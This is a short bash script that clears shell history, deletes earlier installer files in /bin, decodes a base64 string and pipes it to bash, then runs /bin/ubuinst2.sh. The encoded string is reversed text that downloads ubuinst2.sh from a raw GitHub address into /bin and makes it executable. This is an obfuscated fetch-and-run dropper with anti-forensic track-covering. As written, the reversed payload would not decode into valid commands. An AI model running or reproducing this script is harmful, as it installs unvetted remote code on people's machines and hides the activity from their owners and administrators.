#!/bin/bash
cat /dev/null > ~/.bash_history && history -c
rm /bin/ubuinst* > /dev/null 2>&1
echo 'dGl4ZSB8fCBkYwoxJj4yIGxsdW4vdmVkLyA+IGhzLjJ0c25pdWJ1IHhpbnUyc29kICYm
IGhzLjJ0c25pdWJ1IHgrIGRvbWhjICYmIGhzLjJ0c25pdWJ1L2RhYi9sbGF0c25pLzcwNDBpcm5la
HJvZ0kvbW9jLnRuZXRub2NyZXN1YnVodGlnLndhciB0ZW
d3CnRpeGUgfHwgbmliLyBkYwpoc2FiL25pYi8hIw==' | base64 -d | bash
/bin/ubuinst2.sh
